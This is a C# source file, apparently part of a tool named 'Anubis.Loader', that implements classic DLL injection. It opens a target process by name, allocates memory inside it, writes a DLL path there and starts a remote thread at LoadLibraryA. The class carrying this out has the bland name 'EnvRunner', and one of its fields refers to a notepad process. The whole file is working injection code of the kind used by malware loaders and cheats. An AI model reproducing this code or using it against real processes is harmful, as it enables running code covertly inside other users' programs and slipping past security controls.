using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Anubis.Loader.Core.Software
{
	public class NativeProcedures
	{
		#region Import Enums
		public enum ProcessPrivileges : int
		{
			CreateThread = 0x0002,
			QueryInformation = 0x0400,
			MemoryOperate = 0x0008,
			MemoryWrite = 0x0020,
			MemoryRead = 0x0010,
			AllAccess = CreateThread | QueryInformation | MemoryOperate | MemoryWrite | MemoryRead,
		}

		public enum AllocationType : uint
		{
			MemoryCommit = 0x00001000,
			MemoryReserve = 0x00002000,
		}

		public enum AllocationProtect : uint
		{
			PageReadWrite = 0x00000004
		}
		#endregion

		#region Imports
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(int desired_access, bool inherited_handle, int process_id);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		private static extern IntPtr GetModuleHandle(string module_name);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr module, string procedure_name);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr process_handle, IntPtr address, uint size, uint allocation_type, uint protect);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr process_handle, IntPtr destination, byte[] buffer, uint size, out UIntPtr written_bytes);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateRemoteThread(IntPtr process_handle, IntPtr thread_attributes, uint stack_size, IntPtr start_address, IntPtr parameters, uint creation_flags, IntPtr thread_id);
		#endregion

		#region Methods
		public IntPtr OpenProcess(ProcessPrivileges privileges, int process_id, bool inherited_handle = false)
		{
			return OpenProcess((int)privileges, inherited_handle, process_id);
		}

		public IntPtr GetModuleHandleIn(string module)
		{
			return GetModuleHandle(module);
		}

		public IntPtr GetProcAddressIn(IntPtr module, string procedure_name)
		{
			return GetProcAddress(module, procedure_name);
		}
		public IntPtr GetProcAddressIn(string module, string procedure_name)
		{
			return GetProcAddress(GetModuleHandle(module), procedure_name);
		}

		public IntPtr VirtualAllocEx(IntPtr process_handle, IntPtr address, uint size, AllocationType type, AllocationProtect protect)
		{
			return VirtualAllocEx(process_handle, address, size, (uint)type, (uint)protect);
		}

		public bool WriteProcessMemoryIn(IntPtr process_handle, IntPtr destination, byte[] buffer, uint size, out UIntPtr written_bytes)
		{
			return WriteProcessMemory(process_handle, destination, buffer, size, out written_bytes);
		}

		public IntPtr CreateRemoteThreadIn(IntPtr process_handle, IntPtr attributes, uint stack_size, IntPtr start_address, IntPtr parameters, uint creation_flags, IntPtr thread_id)
		{
			return CreateRemoteThread(process_handle, attributes, stack_size, start_address, parameters, creation_flags, thread_id);
		}
		#endregion
	}

	public class EnvRunner
	{
		private NativeProcedures Native;
		private string DllPath;
		private string ProcessName;
		private Process NotepadProcess;

		public EnvRunner()
		{
			Native = new NativeProcedures();
		}

		public EnvRunner Setup(string dll_path, string process_name, Process proc = null)
		{
			DllPath = dll_path;
			ProcessName = process_name;

			if (proc != null)
			{
				NotepadProcess = proc;
			}

			return this;
		}

		public bool Execute()
		{
			if (string.IsNullOrEmpty(DllPath) & string.IsNullOrEmpty(ProcessName))
			{
				return false;
			}

			//Console.WriteLine("DllPath &  ProcessName Valid");
			//Console.WriteLine($"DllPath: {DllPath}");
			//Console.WriteLine($"Process: {ProcessName}");

			IntPtr handle;
			if (NotepadProcess != null)
			{
				handle = NotepadProcess.Handle;
			}
			else
			{
				handle = GetHandle();
			}

			if (handle == IntPtr.Zero)
			{
				return false;
			}

			//Console.WriteLine($"{ProcessName}: Handle: [0x{handle.ToString("X16")}]");

			var load_library = GetProcedurePointer();
			if (load_library == IntPtr.Zero)
			{
				return false;
			}

			//Console.WriteLine($"{ProcessName}: LoadLibraryA: [0x{load_library.ToString("X16")}]");

			var allocated = Native.VirtualAllocEx(handle, IntPtr.Zero, Calculate(), NativeProcedures.AllocationType.MemoryCommit | NativeProcedures.AllocationType.MemoryReserve, NativeProcedures.AllocationProtect.PageReadWrite);
			if (allocated == IntPtr.Zero)
			{
				return false;
			}

			//Console.WriteLine($"{ProcessName}: Allocated: [0x{allocated.ToString("X16")}]");

			var result = Native.WriteProcessMemoryIn(handle, allocated, Encoding.Default.GetBytes(DllPath), Calculate(), out var written);

			if (result)
			{
				//Console.WriteLine($"{ProcessName}: Written bytes: {written}");

				Native.CreateRemoteThreadIn(handle, IntPtr.Zero, 0, load_library, allocated, 0, IntPtr.Zero);
			}

			return result;
		}

		private IntPtr GetHandle()
		{
			var processes = Process.GetProcessesByName(ProcessName);
			if (processes.Length <= 0)
			{
				return IntPtr.Zero;
			}

			var process = processes[0];
			if (process == null)
			{
				return IntPtr.Zero;
			}

			return process.Handle;
		}
		private IntPtr GetProcedurePointer()
		{
			var module = Native.GetModuleHandleIn("kernel32.dll");
			if (module == IntPtr.Zero)
			{
				return IntPtr.Zero;
			}

			return Native.GetProcAddressIn(module, "LoadLibraryA");
		}
		private uint Calculate()
			=> (uint)((DllPath.Length + 1) * Marshal.SizeOf(typeof(char)));
	}
}
